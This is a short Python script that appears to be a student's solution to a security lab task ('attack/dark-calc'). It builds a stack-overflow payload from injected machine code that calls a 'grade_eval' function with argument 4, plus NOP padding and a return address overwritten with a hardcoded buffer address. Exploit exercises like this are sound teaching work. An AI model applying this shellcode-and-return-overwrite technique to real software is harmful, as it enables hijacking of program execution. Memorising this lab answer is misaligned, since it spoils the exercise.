#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
'''
import sys

payload = b""

sys.stdout.buffer.write(payload)
'''
#!/usr/bin/env python3
import struct
import sys

GRADE_EVAL = 0x0000000000401a87  # GDB 查到的 grade_eval 地址
BUFFER_ADDR = 0x0000721000800fd0  # GDB 查到的 expression 缓冲区地址

payload = (
    b"\xbf\x04\x00\x00\x00"                  # mov edi, 4
    + b"\x48\xb8" + struct.pack("<Q", GRADE_EVAL)  # movabs rax, grade_eval
    + b"\xff\xe0"                            # jmp rax
)
payload += b"\x90" * (24 - len(payload))     # 填到返回地址前
payload += struct.pack("<Q", BUFFER_ADDR)    # 覆盖返回地址

sys.stdout.buffer.write(payload)